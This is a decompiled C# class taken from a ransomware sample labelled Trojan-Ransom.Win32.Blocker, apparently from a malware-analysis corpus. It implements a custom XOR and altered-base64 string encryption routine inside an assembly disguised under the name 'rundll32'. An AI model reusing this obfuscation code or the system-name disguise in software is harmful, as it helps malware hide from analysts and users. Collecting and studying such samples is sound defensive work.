// Decompiled with JetBrains decompiler
// Type: rundll32.encryption.xor
// Assembly: rundll32, Version=6.1.7600.16385, Culture=neutral, PublicKeyToken=null
// MVID: F8DEF9AB-CB2D-4DED-9871-4A53218D5E3A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.jlzp-3198bccbd4230852e51b4a91bbbb499340cca67260e90e0a7fbcec0fe32fa3e8.exe

using System;

namespace rundll32.encryption
{
  internal class xor
  {
    private static string _b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijk.mnopqrstuvwxyz-123456789+/=";

    public static string encrypt(string data, string key)
    {
      int index = 0;
      string str1 = "";
      foreach (int num1 in data)
      {
        int num2 = (num1 ^ (int) key[index]) + key.Length;
        if (++index >= key.Length)
          index = 0;
        str1 += xor.DecToBinary(num2, 8);
      }
      int num = 0;
      string str2 = "";
      for (int startIndex = 0; startIndex < str1.Length; startIndex += 4)
      {
        int dec = xor.BinToDec(str1.Substring(startIndex, 4));
        str2 += xor.GetB64FromN(dec * 4 + num);
        if (++num > 3)
          num = 0;
      }
      return str2;
    }

    public static string decrypt(string data, string key)
    {
      int num1 = 0;
      string str1 = "";
      foreach (char n in data)
      {
        int num2 = (xor.GetNFromB64(n) - num1) / 4;
        str1 += xor.DecToBinary(num2, 4);
        if (++num1 > 3)
          num1 = 0;
      }
      int index = 0;
      string str2 = "";
      for (int startIndex = 0; startIndex < str1.Length && startIndex + 8 <= str1.Length; startIndex += 8)
      {
        int c = xor.BinToDec(str1.Substring(startIndex, 8)) - key.Length ^ (int) key[index];
        if (++index >= key.Length)
          index = 0;
        str2 += new string((char) c, 1);
      }
      return str2;
    }

    private static int GetNFromB64(char n) => xor._b64.IndexOf(n);

    private static string GetB64FromN(int n) => n > xor._b64.Length ? "=" : new string(xor._b64[n], 1);

    private static string DecToBinary(int value, int length)
    {
      string str1 = "";
      for (; value > 0; value /= 2)
        str1 += (string) (object) (value % 2);
      string str2 = "";
      foreach (char c in str1)
        str2 = new string(c, 1) + str2;
      string str3 = str2;
      return new string('0', length - str3.Length) + str3;
    }

    private static int BinToDec(string Binary) => Convert.ToInt32(Binary, 2);
  }
}
